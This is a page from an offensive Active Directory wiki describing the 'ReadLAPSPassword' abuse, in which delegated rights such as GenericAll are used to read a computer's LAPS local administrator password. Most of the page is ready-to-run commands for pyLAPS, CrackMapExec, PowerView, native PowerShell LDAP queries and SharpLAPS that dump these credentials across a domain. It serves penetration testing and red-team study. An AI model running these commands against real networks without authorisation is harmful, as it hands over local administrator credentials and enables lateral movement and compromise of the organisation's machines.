# ReadLAPSPassword

This abuse can be carried out when controlling an object that has `GenericAll` or `AllExtendedRights` (or combination of `GetChanges` and (`GetChangesInFilteredSet` or `GetChangesAll`) for domain-wise synchronization) over the target computer configured for LAPS. The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator).

This page is about LAPS-based attacks, you may have a look on [LAPS-based persistences](../../../a-d/persistence/laps.md) and [LAPS enumeration](../../../a-d/recon/objects-and-settings/laps.md).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [pyLAPS](https://github.com/p0dalirius/pyLAPS) (Python) can be used to retrieve LAPS passwords.

```bash
pyLAPS.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip 192.168.56.101
```

Alternatively, [CrackMapExec](https://github.com/mpgn/CrackMapExec) also has this ability (since v5.1.6).. In case it doesn't work [this public module](https://github.com/T3KX/Crackmapexec-LAPS) for CrackMapExec could also be used.

```bash
# Default command
cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps

# The COMPUTER filter can be the name or wildcard (e.g. WIN-S10, WIN-* etc. Default: *)
cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps -O computer="target-*"
```

Impacket's ntlmrelayx also carries that feature, usable with the `--dump-laps`.

[LAPSDumper](https://github.com/n00py/LAPSDumper) is another Python alternative.
{% endtab %}

{% tab title="Windows" %}
This can be achieved with the Active Directory PowerShell module.

```bash
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```

The [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) powershell module from PowerSploit can also be used for that purpose.

```powershell
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

Using native PowerShell

```powershell
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
```

[SharpLAPS](https://github.com/swisskyrepo/SharpLAPS) (C#) automates that process.

```bash
SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://simondotsh.com/infosec/2022/07/11/dirsync.html" %}
